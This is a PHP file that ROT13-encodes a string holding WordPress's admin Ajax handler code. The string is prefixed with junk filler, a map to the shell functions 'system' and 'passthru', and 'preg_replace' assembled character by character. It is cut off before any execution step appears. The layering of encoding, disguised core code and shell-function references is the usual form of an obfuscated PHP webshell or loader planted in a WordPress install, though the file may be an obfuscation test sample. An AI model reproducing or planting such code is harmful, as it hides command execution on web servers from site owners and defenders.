<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Nqzvavfgengvba NCV: Pber Nwnk unaqyref
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 2.1.0
 */

//
// Ab-cevivyrtr Nwnk unaqyref.
//

/**
 * Unaqyrf gur Urnegorng NCV va gur ab-cevivyrtr pbagrkg ivn NWNK .
 *
 * Ehaf jura gur hfre vf abg ybttrq va.
 *
 * @fvapr 3.6.0
 */
shapgvba jc_nwnk_abcevi_urnegorng() {
	$erfcbafr = neenl();

	// 'fperra_vq' vf gur fnzr nf $pheerag_fperra->vq naq gur WF tybony 'cntrabj'.
	vs ( ! rzcgl( $_CBFG['fperra_vq'] ) ) {
		$fperra_vq = fnavgvmr_xrl( $_CBFG['fperra_vq'] );
	} ryfr {
		$fperra_vq = 'sebag';
	}

	vs ( ! rzcgl( $_CBFG['qngn'] ) ) {
		$qngn = jc_hafynfu( (neenl) $_CBFG['qngn'] );

		/**
		 * Svygref Urnegorng Nwnk erfcbafr va ab-cevivyrtr raivebazragf.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz neenl  $erfcbafr  Gur ab-cevi Urnegorng erfcbafr.
		 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
		 * @cnenz fgevat $fperra_vq Gur fperra VQ.
		 */
		$erfcbafr = nccyl_svygref( 'urnegorng_abcevi_erprvirq', $erfcbafr, $qngn, $fperra_vq );
	}

	/**
	 * Svygref Urnegorng Nwnk erfcbafr va ab-cevivyrtr raivebazragf jura ab qngn vf cnffrq.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz neenl  $erfcbafr  Gur ab-cevi Urnegorng erfcbafr.
	 * @cnenz fgevat $fperra_vq Gur fperra VQ.
	 */
	$erfcbafr = nccyl_svygref( 'urnegorng_abcevi_fraq', $erfcbafr, $fperra_vq );

	/**
	 * Sverf jura Urnegorng gvpxf va ab-cevivyrtr raivebazragf.
	 *
	 * Nyybjf gur genafcbeg gb or rnfvyl ercynprq jvgu ybat-cbyyvat.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz neenl  $erfcbafr  Gur ab-cevi Urnegorng erfcbafr.
	 * @cnenz fgevat $fperra_vq Gur fperra VQ.
	 */
	qb_npgvba( 'urnegorng_abcevi_gvpx', $erfcbafr, $fperra_vq );

	// Fraq gur pheerag gvzr nppbeqvat gb gur freire.
	$erfcbafr['freire_gvzr'] = gvzr();

	jc_fraq_wfba( $erfcbafr );
}

//
// TRG-onfrq Nwnk unaqyref.
//

/**
 * Unaqyrf srgpuvat n yvfg gnoyr ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_srgpu_yvfg() {
	$yvfg_pynff = $_TRG['yvfg_netf']['pynff'];
	purpx_nwnk_ersrere( \"srgpu-yvfg-$yvfg_pynff\", '_nwnk_srgpu_yvfg_abapr' );

	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( $yvfg_pynff, neenl( 'fperra' => $_TRG['yvfg_netf']['fperra']['vq'] ) );
	vs ( ! $jc_yvfg_gnoyr ) {
		jc_qvr( 0 );
	}

	vs ( ! $jc_yvfg_gnoyr->nwnk_hfre_pna() ) {
		jc_qvr( -1 );
	}

	$jc_yvfg_gnoyr->nwnk_erfcbafr();

	jc_qvr( 0 );
}

/**
 * Unaqyrf gnt frnepu ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_nwnk_gnt_frnepu() {
	vs ( ! vffrg( $_TRG['gnk'] ) ) {
		jc_qvr( 0 );
	}

	$gnkbabzl        = fnavgvmr_xrl( $_TRG['gnk'] );
	$gnkbabzl_bowrpg = trg_gnkbabzl( $gnkbabzl );

	vs ( ! $gnkbabzl_bowrpg ) {
		jc_qvr( 0 );
	}

	vs ( ! pheerag_hfre_pna( $gnkbabzl_bowrpg->pnc->nffvta_grezf ) ) {
		jc_qvr( -1 );
	}

	$frnepu = jc_hafynfu( $_TRG['d'] );

	$pbzzn = _k( ',', 'gnt qryvzvgre' );
	vs ( ',' !== $pbzzn ) {
		$frnepu = fge_ercynpr( $pbzzn, ',', $frnepu );
	}

	vs ( fge_pbagnvaf( $frnepu, ',' ) ) {
		$frnepu = rkcybqr( ',', $frnepu );
		$frnepu = $frnepu[ pbhag( $frnepu ) - 1 ];
	}

	$frnepu = gevz( $frnepu );

	/**
	 * Svygref gur zvavzhz ahzore bs punenpgref erdhverq gb sver n gnt frnepu ivn Nwnk.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz vag         $punenpgref      Gur zvavzhz ahzore bs punenpgref erdhverq. Qrsnhyg 2.
	 * @cnenz JC_Gnkbabzl $gnkbabzl_bowrpg Gur gnkbabzl bowrpg.
	 * @cnenz fgevat      $frnepu          Gur frnepu grez.
	 */
	$grez_frnepu_zva_punef = (vag) nccyl_svygref( 'grez_frnepu_zva_punef', 2, $gnkbabzl_bowrpg, $frnepu );

	/*
	 * Erdhver $grez_frnepu_zva_punef punef sbe zngpuvat (qrsnhyg: 2)
	 * rafher vg'f n aba-artngvir, aba-mreb vagrtre.
	 */
	vs ( ( 0 === $grez_frnepu_zva_punef ) || ( fgeyra( $frnepu ) < $grez_frnepu_zva_punef ) ) {
		jc_qvr();
	}

	$erfhygf = trg_grezf(
		neenl(
			'gnkbabzl'   => $gnkbabzl,
			'anzr__yvxr' => $frnepu,
			'svryqf'     => 'anzrf',
			'uvqr_rzcgl' => snyfr,
			'ahzore'     => vffrg( $_TRG['ahzore'] ) ? (vag) $_TRG['ahzore'] : 0,
		)
	);

	/**
	 * Svygref gur Nwnk grez frnepu erfhygf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[]    $erfhygf         Neenl bs grez anzrf.
	 * @cnenz JC_Gnkbabzl $gnkbabzl_bowrpg Gur gnkbabzl bowrpg.
	 * @cnenz fgevat      $frnepu          Gur frnepu grez.
	 */
	$erfhygf = nccyl_svygref( 'nwnk_grez_frnepu_erfhygf', $erfhygf, $gnkbabzl_bowrpg, $frnepu );

	rpub vzcybqr( \"\a\", $erfhygf );
	jc_qvr();
}

/**
 * Unaqyrf pbzcerffvba grfgvat ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_jc_pbzcerffvba_grfg() {
	vs ( ! pheerag_hfre_pna( 'znantr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	vs ( vav_trg( 'myvo.bhgchg_pbzcerffvba' ) || 'bo_tmunaqyre' === vav_trg( 'bhgchg_unaqyre' ) ) {
		// Hfr `hcqngr_bcgvba()` ba fvatyr fvgr gb znex gur bcgvba sbe nhgbybnqvat.
		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf', 0 );
		} ryfr {
			hcqngr_bcgvba( 'pna_pbzcerff_fpevcgf', 0, gehr );
		}
		jc_qvr( 0 );
	}

	vs ( vffrg( $_TRG['grfg'] ) ) {
		urnqre( 'Rkcverf: Jrq, 11 Wna 1984 05:00:00 TZG' );
		urnqre( 'Ynfg-Zbqvsvrq: ' . tzqngr( 'Q, q Z L U:v:f' ) . ' TZG' );
		urnqre( 'Pnpur-Pbageby: ab-pnpur, zhfg-erinyvqngr, znk-ntr=0' );
		urnqre( 'Pbagrag-Glcr: nccyvpngvba/wninfpevcg; punefrg=HGS-8' );
		$sbepr_tmvc = ( qrsvarq( 'RASBEPR_TMVC' ) && RASBEPR_TMVC );
		$grfg_fge   = '\"jcPbzcerffvbaGrfg Yberz vcfhz qbybe fvg nzrg pbafrpgrghre zbyyvf fncvra hean hg n. Rh abahzzl pbaqvzraghz sevatvyyn grzcbe cergvhz cyngrn iry avou arghf Znrpranf. Unp zbyrfgvr nzrg whfgb dhvf cryyragrfdhr rfg hygevprf vagreqhz avou Zbeov. Penf znggvf cergvhz Cunfryyhf nagr vcfhz vcfhz hg fbpvvf Fhfcraqvffr Yberz. Nagr rg aba zbyrfgvr. Cbegn hean Irfgvohyhz rtrfgnf vq pbathr avou rh evfhf tenivqn fvg. Np nhthr nhpgbe Hg rg aba n ryvg znffn vq fbqnyrf. Ryvg rh Ahyyn ng avou nqvcvfpvat znggvf ynphf znhevf ng grzchf. Arghf avou dhvf fhfpvcvg arp srhtvng rtrg frq yberz rg hean. Cryyragrfdhr ynphf ng hg znffn pbafrpgrghre yvthyn hg nhpgbe frzcre Cryyragrfdhr. Hg zrghf znffn avou dhnz Phenovghe zbyrfgvr arp znhevf pbathr. Ibyhgcng zbyrfgvr ryvg whfgb snpvyvfvf ardhr np evfhf Hg anfprghe gevfgvdhr. Ivgnr fvg yberz gryyhf rg dhvf Cunfryyhf ynphf gvapvqhag ahap Shfpr. Cunergen jvfv Fhfcraqvffr zhf fntvggvf yvoreb ynpvavn Vagrtre pbafrdhng np Cunfryyhf. Rg hean np phefhf gbegbe nyvdhnz Nyvdhnz nzrg gryyhf ibyhgcng Irfgvohyhz. Whfgb vagreqhz pbaqvzraghz Va nhthr pbathr gryyhf fbyyvpvghqva Dhvfdhr dhvf avou.\"';

		vs ( '1' === $_TRG['grfg'] ) {
			rpub $grfg_fge;
			jc_qvr();
		} ryfrvs ( '2' === $_TRG['grfg'] ) {
			vs ( ! vffrg( $_FREIRE['UGGC_NPPRCG_RAPBQVAT'] ) ) {
				jc_qvr( -1 );
			}

			vs ( snyfr !== fgevcbf( $_FREIRE['UGGC_NPPRCG_RAPBQVAT'], 'qrsyngr' ) && shapgvba_rkvfgf( 'tmqrsyngr' ) && ! $sbepr_tmvc ) {
				urnqre( 'Pbagrag-Rapbqvat: qrsyngr' );
				$bhg = tmqrsyngr( $grfg_fge, 1 );
			} ryfrvs ( snyfr !== fgevcbf( $_FREIRE['UGGC_NPPRCG_RAPBQVAT'], 'tmvc' ) && shapgvba_rkvfgf( 'tmrapbqr' ) ) {
				urnqre( 'Pbagrag-Rapbqvat: tmvc' );
				$bhg = tmrapbqr( $grfg_fge, 1 );
			} ryfr {
				jc_qvr( -1 );
			}

			rpub $bhg;
			jc_qvr();
		} ryfrvs ( 'ab' === $_TRG['grfg'] ) {
			purpx_nwnk_ersrere( 'hcqngr_pna_pbzcerff_fpevcgf' );
			// Hfr `hcqngr_bcgvba()` ba fvatyr fvgr gb znex gur bcgvba sbe nhgbybnqvat.
			vs ( vf_zhygvfvgr() ) {
				hcqngr_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf', 0 );
			} ryfr {
				hcqngr_bcgvba( 'pna_pbzcerff_fpevcgf', 0, gehr );
			}
		} ryfrvs ( 'lrf' === $_TRG['grfg'] ) {
			purpx_nwnk_ersrere( 'hcqngr_pna_pbzcerff_fpevcgf' );
			// Hfr `hcqngr_bcgvba()` ba fvatyr fvgr gb znex gur bcgvba sbe nhgbybnqvat.
			vs ( vf_zhygvfvgr() ) {
				hcqngr_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf', 1 );
			} ryfr {
				hcqngr_bcgvba( 'pna_pbzcerff_fpevcgf', 1, gehr );
			}
		}
	}

	jc_qvr( 0 );
}

/**
 * Unaqyrf vzntr rqvgbe cerivrjf ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_vztrqvg_cerivrj() {
	$cbfg_vq = (vag) $_TRG['cbfgvq'];
	vs ( rzcgl( $cbfg_vq ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	purpx_nwnk_ersrere( \"vzntr_rqvgbe-$cbfg_vq\" );

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

	vs ( ! fgernz_cerivrj_vzntr( $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	jc_qvr();
}

/**
 * Unaqyrf bRzorq pnpuvat ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 */
shapgvba jc_nwnk_brzorq_pnpur() {
	$TYBONYF['jc_rzorq']->pnpur_brzorq( $_TRG['cbfg'] );
	jc_qvr( 0 );
}

/**
 * Unaqyrf hfre nhgbpbzcyrgr ivn NWNK.
 *
 * @fvapr 3.4.0
 */
shapgvba jc_nwnk_nhgbpbzcyrgr_hfre() {
	vs ( ! vf_zhygvfvgr() || ! pheerag_hfre_pna( 'cebzbgr_hfref' ) || jc_vf_ynetr_argjbex( 'hfref' ) ) {
		jc_qvr( -1 );
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/hfre-arj.cuc */
	vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) && ! nccyl_svygref( 'nhgbpbzcyrgr_hfref_sbe_fvgr_nqzvaf', snyfr ) ) {
		jc_qvr( -1 );
	}

	$erghea = neenl();

	/*
	 * Purpx gur glcr bs erdhrfg.
	 * Pheerag nyybjrq inyhrf ner `nqq` naq `frnepu`.
	 */
	vs ( vffrg( $_ERDHRFG['nhgbpbzcyrgr_glcr'] ) && 'frnepu' === $_ERDHRFG['nhgbpbzcyrgr_glcr'] ) {
		$glcr = $_ERDHRFG['nhgbpbzcyrgr_glcr'];
	} ryfr {
		$glcr = 'nqq';
	}

	/*
	 * Purpx gur qrfverq svryq sbe inyhr.
	 * Pheerag nyybjrq inyhrf ner `hfre_rznvy` naq `hfre_ybtva`.
	 */
	vs ( vffrg( $_ERDHRFG['nhgbpbzcyrgr_svryq'] ) && 'hfre_rznvy' === $_ERDHRFG['nhgbpbzcyrgr_svryq'] ) {
		$svryq = $_ERDHRFG['nhgbpbzcyrgr_svryq'];
	} ryfr {
		$svryq = 'hfre_ybtva';
	}

	// Rkpyhqr pheerag hfref bs guvf oybt.
	vs ( vffrg( $_ERDHRFG['fvgr_vq'] ) ) {
		$vq = nofvag( $_ERDHRFG['fvgr_vq'] );
	} ryfr {
		$vq = trg_pheerag_oybt_vq();
	}

	$vapyhqr_oybt_hfref = ( 'frnepu' === $glcr ? trg_hfref(
		neenl(
			'oybt_vq' => $vq,
			'svryqf'  => 'VQ',
		)
	) : neenl() );

	$rkpyhqr_oybt_hfref = ( 'nqq' === $glcr ? trg_hfref(
		neenl(
			'oybt_vq' => $vq,
			'svryqf'  => 'VQ',
		)
	) : neenl() );

	$hfref = trg_hfref(
		neenl(
			'oybt_vq'        => snyfr,
			'frnepu'         => '*' . $_ERDHRFG['grez'] . '*',
			'vapyhqr'        => $vapyhqr_oybt_hfref,
			'rkpyhqr'        => $rkpyhqr_oybt_hfref,
			'frnepu_pbyhzaf' => neenl( 'hfre_ybtva', 'hfre_avpranzr', 'hfre_rznvy' ),
		)
	);

	sbernpu ( $hfref nf $hfre ) {
		$erghea[] = neenl(
			/* genafyngbef: 1: Hfre ybtva, 2: Hfre rznvy nqqerff. */
			'ynory' => fcevags( _k( '%1$f (%2$f)', 'hfre nhgbpbzcyrgr erfhyg' ), $hfre->hfre_ybtva, $hfre->hfre_rznvy ),
			'inyhr' => $hfre->$svryq,
		);
	}

	jc_qvr( jc_wfba_rapbqr( $erghea ) );
}

/**
 * Unaqyrf Nwnk erdhrfgf sbe pbzzhavgl riragf
 *
 * @fvapr 4.8.0
 */
shapgvba jc_nwnk_trg_pbzzhavgl_riragf() {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-pbzzhavgl-riragf.cuc';

	purpx_nwnk_ersrere( 'pbzzhavgl_riragf' );

	$frnepu         = vffrg( $_CBFG['ybpngvba'] ) ? jc_hafynfu( $_CBFG['ybpngvba'] ) : '';
	$gvzrmbar       = vffrg( $_CBFG['gvzrmbar'] ) ? jc_hafynfu( $_CBFG['gvzrmbar'] ) : '';
	$hfre_vq        = trg_pheerag_hfre_vq();
	$fnirq_ybpngvba = trg_hfre_bcgvba( 'pbzzhavgl-riragf-ybpngvba', $hfre_vq );
	$riragf_pyvrag  = arj JC_Pbzzhavgl_Riragf( $hfre_vq, $fnirq_ybpngvba );
	$riragf         = $riragf_pyvrag->trg_riragf( $frnepu, $gvzrmbar );
	$vc_punatrq     = snyfr;

	vs ( vf_jc_reebe( $riragf ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'reebe' => $riragf->trg_reebe_zrffntr(),
			)
		);
	} ryfr {
		vs ( rzcgl( $fnirq_ybpngvba['vc'] ) && ! rzcgl( $riragf['ybpngvba']['vc'] ) ) {
			$vc_punatrq = gehr;
		} ryfrvs ( vffrg( $fnirq_ybpngvba['vc'] ) && ! rzcgl( $riragf['ybpngvba']['vc'] ) && $fnirq_ybpngvba['vc'] !== $riragf['ybpngvba']['vc'] ) {
			$vc_punatrq = gehr;
		}

		/*
		 * Gur ybpngvba fubhyq bayl or hcqngrq jura vg punatrf. Gur NCV qbrfa'g nyjnlf erghea
		 * n shyy ybpngvba; fbzrgvzrf vg'f zvffvat gur qrfpevcgvba be pbhagel. Gur ybpngvba
		 * gung jnf fnirq qhevat gur vavgvny erdhrfg vf xabja gb or tbbq naq pbzcyrgr, gubhtu.
		 * Vg fubhyq or yrsg vagnpg hagvy gur hfre rkcyvpvgyl punatrf vg (rvgure ol znahnyyl
		 * frnepuvat sbe n arj ybpngvba, be ol punatvat gurve VC nqqerff).
		 *
		 * Vs gur ybpngvba jnf hcqngrq jvgu na vapbzcyrgr erfcbafr sebz gur NCV, gura vg pbhyq
		 * oernx nffhzcgvbaf gung gur HV znxrf (r.t., gung gurer jvyy nyjnlf or n qrfpevcgvba
		 * gung pbeerfcbaqf gb n yngvghqr/ybatvghqr ybpngvba).
		 *
		 * Gur ybpngvba vf fgberq argjbex-jvqr, fb gung gur hfre qbrfa'g unir gb frg vg ba rnpu fvgr.
		 */
		vs ( $vc_punatrq || $frnepu ) {
			hcqngr_hfre_zrgn( $hfre_vq, 'pbzzhavgl-riragf-ybpngvba', $riragf['ybpngvba'] );
		}

		jc_fraq_wfba_fhpprff( $riragf );
	}
}

/**
 * Unaqyrf qnfuobneq jvqtrgf ivn NWNK.
 *
 * @fvapr 3.4.0
 */
shapgvba jc_nwnk_qnfuobneq_jvqtrgf() {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/qnfuobneq.cuc';

	$cntrabj = $_TRG['cntrabj'];
	vs ( 'qnfuobneq-hfre' === $cntrabj || 'qnfuobneq-argjbex' === $cntrabj || 'qnfuobneq' === $cntrabj ) {
		frg_pheerag_fperra( $cntrabj );
	}

	fjvgpu ( $_TRG['jvqtrg'] ) {
		pnfr 'qnfuobneq_cevznel':
			jc_qnfuobneq_cevznel();
			oernx;
	}
	jc_qvr();
}

/**
 * Unaqyrf Phfgbzvmre cerivrj ybttrq-va fgnghf ivn NWNK.
 *
 * @fvapr 3.4.0
 */
shapgvba jc_nwnk_ybttrq_va() {
	jc_qvr( 1 );
}

//
// Nwnk urycref.
//

/**
 * Fraqf onpx pheerag pbzzrag gbgny naq arj cntr yvaxf vs gurl arrq gb or hcqngrq.
 *
 * Pbagenel gb abezny fhpprff Nwnk erfcbafr (\"1\"), qvr jvgu gvzr() ba fhpprff.
 *
 * @fvapr 2.7.0
 * @npprff cevingr
 *
 * @cnenz vag $pbzzrag_vq
 * @cnenz vag $qrygn
 */
shapgvba _jc_nwnk_qryrgr_pbzzrag_erfcbafr( $pbzzrag_vq, $qrygn = -1 ) {
	$gbgny    = vffrg( $_CBFG['_gbgny'] ) ? (vag) $_CBFG['_gbgny'] : 0;
	$cre_cntr = vffrg( $_CBFG['_cre_cntr'] ) ? (vag) $_CBFG['_cre_cntr'] : 0;
	$cntr     = vffrg( $_CBFG['_cntr'] ) ? (vag) $_CBFG['_cntr'] : 0;
	$hey      = vffrg( $_CBFG['_hey'] ) ? fnavgvmr_hey( $_CBFG['_hey'] ) : '';

	// WF qvqa'g fraq hf rirelguvat jr arrq gb xabj. Whfg qvr jvgu fhpprff zrffntr.
	vs ( ! $gbgny || ! $cre_cntr || ! $cntr || ! $hey ) {
		$gvzr           = gvzr();
		$pbzzrag        = trg_pbzzrag( $pbzzrag_vq );
		$pbzzrag_fgnghf = '';
		$pbzzrag_yvax   = '';

		vs ( $pbzzrag ) {
			$pbzzrag_fgnghf = $pbzzrag->pbzzrag_nccebirq;
		}

		vs ( 1 === (vag) $pbzzrag_fgnghf ) {
			$pbzzrag_yvax = trg_pbzzrag_yvax( $pbzzrag );
		}

		$pbhagf = jc_pbhag_pbzzragf();

		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung'         => 'pbzzrag',
				// Urer sbe pbzcyrgrarff - abg hfrq.
				'vq'           => $pbzzrag_vq,
				'fhccyrzragny' => neenl(
					'fgnghf'               => $pbzzrag_fgnghf,
					'cbfgVq'               => $pbzzrag ? $pbzzrag->pbzzrag_cbfg_VQ : '',
					'gvzr'                 => $gvzr,
					'va_zbqrengvba'        => $pbhagf->zbqrengrq,
					'v18a_pbzzragf_grkg'   => fcevags(
						/* genafyngbef: %f: Ahzore bs pbzzragf. */
						_a( '%f Pbzzrag', '%f Pbzzragf', $pbhagf->nccebirq ),
						ahzore_sbezng_v18a( $pbhagf->nccebirq )
					),
					'v18a_zbqrengvba_grkg' => fcevags(
						/* genafyngbef: %f: Ahzore bs pbzzragf. */
						_a( '%f Pbzzrag va zbqrengvba', '%f Pbzzragf va zbqrengvba', $pbhagf->zbqrengrq ),
						ahzore_sbezng_v18a( $pbhagf->zbqrengrq )
					),
					'pbzzrag_yvax'         => $pbzzrag_yvax,
				),
			)
		);
		$k->fraq();
	}

	$gbgny += $qrygn;
	vs ( $gbgny < 0 ) {
		$gbgny = 0;
	}

	// Bayl qb gur rkcrafvir fghss ba n cntr-oernx, naq nobhg 1 bgure gvzr cre cntr.
	vs ( 0 === $gbgny % $cre_cntr || 1 === zg_enaq( 1, $cre_cntr ) ) {
		$cbfg_vq = 0;
		// Jung glcr bs pbzzrag pbhag ner jr ybbxvat sbe?
		$fgnghf = 'nyy';
		$cnefrq = cnefr_hey( $hey );

		vs ( vffrg( $cnefrq['dhrel'] ) ) {
			cnefr_fge( $cnefrq['dhrel'], $dhrel_inef );

			vs ( ! rzcgl( $dhrel_inef['pbzzrag_fgnghf'] ) ) {
				$fgnghf = $dhrel_inef['pbzzrag_fgnghf'];
			}

			vs ( ! rzcgl( $dhrel_inef['c'] ) ) {
				$cbfg_vq = (vag) $dhrel_inef['c'];
			}

			vs ( ! rzcgl( $dhrel_inef['pbzzrag_glcr'] ) ) {
				$glcr = $dhrel_inef['pbzzrag_glcr'];
			}
		}

		vs ( rzcgl( $glcr ) ) {
			// Bayl hfr gur pbzzrag pbhag vs abg svygrevat ol n pbzzrag_glcr.
			$pbzzrag_pbhag = jc_pbhag_pbzzragf( $cbfg_vq );

			// Jr'er ybbxvat sbe n xabja glcr bs pbzzrag pbhag.
			vs ( vffrg( $pbzzrag_pbhag->$fgnghf ) ) {
				$gbgny = $pbzzrag_pbhag->$fgnghf;
			}
		}
		// Ryfr hfr gur qrperzragrq inyhr sebz nobir.
	}

	// Gur gvzr fvapr gur ynfg pbzzrag pbhag.
	$gvzr    = gvzr();
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
	$pbhagf  = jc_pbhag_pbzzragf();

	$k = arj JC_Nwnk_Erfcbafr(
		neenl(
			'jung'         => 'pbzzrag',
			'vq'           => $pbzzrag_vq,
			'fhccyrzragny' => neenl(
				'fgnghf'               => $pbzzrag ? $pbzzrag->pbzzrag_nccebirq : '',
				'cbfgVq'               => $pbzzrag ? $pbzzrag->pbzzrag_cbfg_VQ : '',
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				'gbgny_vgrzf_v18a'     => fcevags( _a( '%f vgrz', '%f vgrzf', $gbgny ), ahzore_sbezng_v18a( $gbgny ) ),
				'gbgny_cntrf'          => (vag) prvy( $gbgny / $cre_cntr ),
				'gbgny_cntrf_v18a'     => ahzore_sbezng_v18a( (vag) prvy( $gbgny / $cre_cntr ) ),
				'gbgny'                => $gbgny,
				'gvzr'                 => $gvzr,
				'va_zbqrengvba'        => $pbhagf->zbqrengrq,
				'v18a_zbqrengvba_grkg' => fcevags(
					/* genafyngbef: %f: Ahzore bs pbzzragf. */
					_a( '%f Pbzzrag va zbqrengvba', '%f Pbzzragf va zbqrengvba', $pbhagf->zbqrengrq ),
					ahzore_sbezng_v18a( $pbhagf->zbqrengrq )
				),
			),
		)
	);
	$k->fraq();
}

//
// CBFG-onfrq Nwnk unaqyref.
//

/**
 * Unaqyrf nqqvat n uvrenepuvpny grez ivn NWNK.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 */
shapgvba _jc_nwnk_nqq_uvrenepuvpny_grez() {
	$npgvba   = $_CBFG['npgvba'];
	$gnkbabzl = trg_gnkbabzl( fhofge( $npgvba, 4 ) );
	purpx_nwnk_ersrere( $npgvba, '_nwnk_abapr-nqq-' . $gnkbabzl->anzr );

	vs ( ! pheerag_hfre_pna( $gnkbabzl->pnc->rqvg_grezf ) ) {
		jc_qvr( -1 );
	}

	$anzrf  = rkcybqr( ',', $_CBFG[ 'arj' . $gnkbabzl->anzr ] );
	$cnerag = vffrg( $_CBFG[ 'arj' . $gnkbabzl->anzr . '_cnerag' ] ) ? (vag) $_CBFG[ 'arj' . $gnkbabzl->anzr . '_cnerag' ] : 0;

	vs ( 0 > $cnerag ) {
		$cnerag = 0;
	}

	vs ( 'pngrtbel' === $gnkbabzl->anzr ) {
		$cbfg_pngrtbel = vffrg( $_CBFG['cbfg_pngrtbel'] ) ? (neenl) $_CBFG['cbfg_pngrtbel'] : neenl();
	} ryfr {
		$cbfg_pngrtbel = ( vffrg( $_CBFG['gnk_vachg'] ) && vffrg( $_CBFG['gnk_vachg'][ $gnkbabzl->anzr ] ) ) ? (neenl) $_CBFG['gnk_vachg'][ $gnkbabzl->anzr ] : neenl();
	}

	$purpxrq_pngrtbevrf = neenl_znc( 'nofvag', (neenl) $cbfg_pngrtbel );
	$cbchyne_vqf        = jc_cbchyne_grezf_purpxyvfg( $gnkbabzl->anzr, 0, 10, snyfr );

	sbernpu ( $anzrf nf $png_anzr ) {
		$png_anzr          = gevz( $png_anzr );
		$pngrtbel_avpranzr = fnavgvmr_gvgyr( $png_anzr );

		vs ( '' === $pngrtbel_avpranzr ) {
			pbagvahr;
		}

		$png_vq = jc_vafreg_grez( $png_anzr, $gnkbabzl->anzr, neenl( 'cnerag' => $cnerag ) );

		vs ( ! $png_vq || vf_jc_reebe( $png_vq ) ) {
			pbagvahr;
		} ryfr {
			$png_vq = $png_vq['grez_vq'];
		}

		$purpxrq_pngrtbevrf[] = $png_vq;

		vs ( $cnerag ) { // Qb gurfr nyy ng bapr va n frpbaq.
			pbagvahr;
		}

		bo_fgneg();

		jc_grezf_purpxyvfg(
			0,
			neenl(
				'gnkbabzl'             => $gnkbabzl->anzr,
				'qrfpraqnagf_naq_frys' => $png_vq,
				'fryrpgrq_pngf'        => $purpxrq_pngrtbevrf,
				'cbchyne_pngf'         => $cbchyne_vqf,
			)
		);

		$qngn = bo_trg_pyrna();

		$nqq = neenl(
			'jung'     => $gnkbabzl->anzr,
			'vq'       => $png_vq,
			'qngn'     => fge_ercynpr( neenl( \"\a\", \"\g\" ), '', $qngn ),
			'cbfvgvba' => -1,
		);
	}

	vs ( $cnerag ) { // Sbapl - ercynpr gur cnerag naq nyy vgf puvyqera.
		$cnerag  = trg_grez( $cnerag, $gnkbabzl->anzr );
		$grez_vq = $cnerag->grez_vq;

		juvyr ( $cnerag->cnerag ) { // Trg gur gbc cnerag.
			$cnerag = trg_grez( $cnerag->cnerag, $gnkbabzl->anzr );
			vs ( vf_jc_reebe( $cnerag ) ) {
				oernx;
			}
			$grez_vq = $cnerag->grez_vq;
		}

		bo_fgneg();

		jc_grezf_purpxyvfg(
			0,
			neenl(
				'gnkbabzl'             => $gnkbabzl->anzr,
				'qrfpraqnagf_naq_frys' => $grez_vq,
				'fryrpgrq_pngf'        => $purpxrq_pngrtbevrf,
				'cbchyne_pngf'         => $cbchyne_vqf,
			)
		);

		$qngn = bo_trg_pyrna();

		$nqq = neenl(
			'jung'     => $gnkbabzl->anzr,
			'vq'       => $grez_vq,
			'qngn'     => fge_ercynpr( neenl( \"\a\", \"\g\" ), '', $qngn ),
			'cbfvgvba' => -1,
		);
	}

	bo_fgneg();

	jc_qebcqbja_pngrtbevrf(
		neenl(
			'gnkbabzl'         => $gnkbabzl->anzr,
			'uvqr_rzcgl'       => 0,
			'anzr'             => 'arj' . $gnkbabzl->anzr . '_cnerag',
			'beqreol'          => 'anzr',
			'uvrenepuvpny'     => 1,
			'fubj_bcgvba_abar' => '&zqnfu; ' . $gnkbabzl->ynoryf->cnerag_vgrz . ' &zqnfu;',
		)
	);

	$fhc = bo_trg_pyrna();

	$nqq['fhccyrzragny'] = neenl( 'arjpng_cnerag' => $fhc );

	$k = arj JC_Nwnk_Erfcbafr( $nqq );
	$k->fraq();
}

/**
 * Unaqyrf qryrgvat n pbzzrag ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qryrgr_pbzzrag() {
